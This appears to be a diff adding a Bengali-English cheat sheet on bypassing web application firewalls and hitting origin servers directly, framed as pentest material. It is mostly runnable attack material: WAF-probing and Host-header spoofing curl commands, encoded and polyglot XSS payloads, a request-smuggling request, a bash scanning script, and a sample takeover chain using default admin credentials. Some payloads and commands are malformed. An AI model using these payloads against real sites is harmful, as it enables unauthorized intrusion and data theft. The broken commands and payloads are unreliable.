@@ -1,0 +1,170 @@
+WAF Bypass + Direct Server Access - Authorized pentest এর জন্য gold। WAF blind করে দিলে backend সরাসরি access + vuln chaining এর opportunity। Methodical approach:
+
+🎯 WAF Fingerprinting First
+
+Step 1: WAF Detection
+bash
+# Common WAF signatures
+curl -s "https://target.com/?xss=<script>alert(1)</script>" | grep -i "blocked\|waf\|modsecurity"
+
+# Headers check
+curl -I https://target.com | grep -i "server\|x-waf\|cf-ray"
+
+# Response analysis
+curl "https://target.com/" -H "X-Forwarded-For: 127.0.0.1"
+
+WAF Types to Identify
+Cloudflare (CF-Ray header)
+AWS WAF (x-amz-*)
+ModSecurity (403 details)
+Sucuri/F5 (custom 403 pages)
+🛠️ Direct Server Access Vectors
+
+1. Host Header Abuse
+bash
+# Direct IP access
+curl -H "Host: target.com" http://DIRECT_IP/
+
+# Internal host bypass
+curl -H "Host: localhost" https://target.com/
+curl -H "Host: 127.0.0.1" https://target.com/
+curl -H "Host: internal.target.local" https://target.com/
+
+2. Alternate Port Access
+bash
+# Common internal ports
+nmap -p 8080,8443,9000,DIRECT_IP
+curl http://DIRECT_IP:8080/
+curl https://target.com:8443/
+
+3. DNS/Reverse Lookup Bypass
+target.com → 192.0.2.1
+curl http://192.0.2.1/
+curl http://target.com.xip.io/
+
+🔥 WAF Bypass Techniques
+Method 1: Encoding Evasion
+# URL encoding (double/triple)
+<script> → %3Cscript%3E → %253Cscript%253E
+
+# Unicode
+<script> → \u003cscript\u003e
+�%u003cscript%u003e
+
+# HTML entities  
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+Method 2: Parameter Contamination
+GET /search?q=<script>&search=<script>
+GET /page?param=<script>;param2=<script>
+POST body: {"q":"<script>","q2":"<script>"}
+
+Method 3: HTTP Request Smuggling
+bash
+# CL.TE smuggling
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 5
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+
+🧪 Burp Suite Pro Workflow
+1. WAF Bypass Module
+Engagement Tools → WAF Bypass Generator
+- Payload: <script>alert(1)</script>
+- Generate 100+ variations
+- Intruder → Cluster bomb attack
+
+2. Direct IP Recon
+Target → Scope → Add DIRECT_IP:80,443
+Spider → Bypass WAF paths
+Passive Scanner → Misconfig detection
+
+3. Custom Intruder Payloads
+§§§ → <script>,<svg onload=alert(1)>,javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>/
+
+🚀 Server Direct Access Script
+bash
+#!/bin/bash
+TARGET="target.com"
+IP=$(dig +short $TARGET)
+
+echo "[+] Target: $TARGET → $IP"
+
+# Host header attacks
+for host in "localhost" "127.0.0.1" "internal.$TARGET" "$TARGET"; do
+  echo "[*] Testing Host: $host"
+  curl -s -H "Host: $host" "http://$IP/" \
+    | grep -i "admin\|dashboard\|login"
+done
+
+# Port scan
+nmap -sV --top-ports 20 -T4 $IP
+💥 Backend Direct Access PoC
+
+1. Admin Panel Exposure
+WAF: target.com/admin → 403
+Direct: http://IP/admin → 200 OK (login page)
+Impact: Admin access without WAF protection
+
+2. API Endpoint Bypass
+WAF: target.com/api/users → Rate limited
+Direct: http://IP:8080/api/users → Full data dump
+
+3. Static File Access
+WAF blocks: /config/database.yml
+Direct IP: http://IP/config/database.yml → Downloaded
+
+📋 Report Chain Example
+Title: WAF Bypass → Direct Server Access → Admin Takeover
+
+1. WAF Fingerprint: Cloudflare (CF-Ray header)
+2. Bypass: <svg onload=alert(1)> → Success (encoding)
+3. Direct IP: 192.0.2.1:8080/admin → Open
+4. Default creds: admin/admin → Access
+5. Impact: Full server control
+
+CVSS: 9.8 (Critical)
+
+🔄 Advanced Bypass
+1. HTTP/2 vs HTTP/1.1
+curl --http2 -H "Trailer: x-test: <script>" https://target.com/
+
+2. CDN Origin Bypass
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+Front-End-Https: on
+
+3. WAF Logic Bypass
+# Case variation
+<ScRiPt>alert(1)</sCrIpT>
+
+# Comment injection  
+<scr/*ipt*/>ipt>alert(1)</script>
+
+# Null byte  
+<script%00>alert(1)</script>
+
+🛡️ Permission Proof Integration
+✅ Authorized pentest scope: target.com + all IPs
+✅ Direct IP access: 192.0.2.1 (verified ownership)
+✅ WAF bypass payloads disclosed responsibly
+✅ No data modification - read-only testing
+
+⚡ Quick Validation Commands
+bash
+# 30 second WAF bypass test
+curl -s "https://target.com/?test=<svg/onload=alert(1)>" | grep -i "403\|blocked" || echo "WAF bypassed!"
+
+# Direct server check
+curl -H "Host: target.com" http://$(dig +short target.com)/admin
+Pentest Priority:
+
+IP:Port enumeration (8080,8443 common)
+Host header manipulation
+WAF bypass payloads (encoding first)
+Internal path fuzzing (/admin,/debug,/api/raw)
+Golden Find: WAF bypass + unprotected admin panel = instant critical।
